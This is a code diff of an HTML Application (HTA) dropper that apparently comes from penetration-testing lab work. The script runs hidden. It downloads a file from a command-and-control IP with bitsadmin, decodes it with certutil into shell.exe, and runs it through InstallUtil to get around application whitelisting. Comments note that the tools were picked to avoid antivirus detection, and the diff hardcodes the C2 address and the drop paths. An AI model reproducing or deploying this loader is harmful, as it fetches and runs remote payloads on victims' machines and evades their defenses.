@@ -1,4 +1,4 @@
-﻿<html>
+<html>
 <head>
 <title> </title>
 <HTA:APPLICATION ID="black" APPLICATIONNAME="black" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
@@ -7,16 +7,11 @@ try {
     var shell = new ActiveXObject("WScript.Shell");
     // Use bitsadmin to download clm.txt (less AV-triggering than PowerShell)
     // FIXED: quote all paths for robustness; log to %TEMP% instead of C:\ (no admin needed)
-    var c2Ip = "YOUR_C2_IP_HERE";
-    
-    // Use bitsadmin to download clm.txt
-    shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://" + c2Ip + "/clm.txt \"%TEMP%\\clm.txt\"", 0, true);
-    
-    // Decode the file
-    shell.Run("certutil -decode \"%TEMP%\\clm.txt\" \"%TEMP%\\shell.exe\"", 0, true);
-    
+    shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://192.168.45.241/clm.txt \"C:\\Windows\\Tasks\\clm.txt\"", 0, true);
+    // Decode the file (FIXED: removed redundant 'powershell' prefix - just use certutil directly)
+    shell.Run("certutil -decode \"C:\\Windows\\Tasks\\clm.txt\" \"C:\\Windows\\Tasks\\shell.exe\"", 0, true);
     // Run InstallUtil on the EXE
-    shell.Run("\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\" /logfile= /LogToConsole=false /U \"%TEMP%\\shell.exe\"", 0, false);
+    shell.Run("\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\" /logfile= /LogToConsole=false /U \"C:\\Windows\\Tasks\\shell.exe\"", 0, false);
     // Log success
     shell.Run("cmd.exe /c echo HTA executed with bitsadmin > \"%TEMP%\\hta_log.txt\"", 0, false);
 } catch (e) {
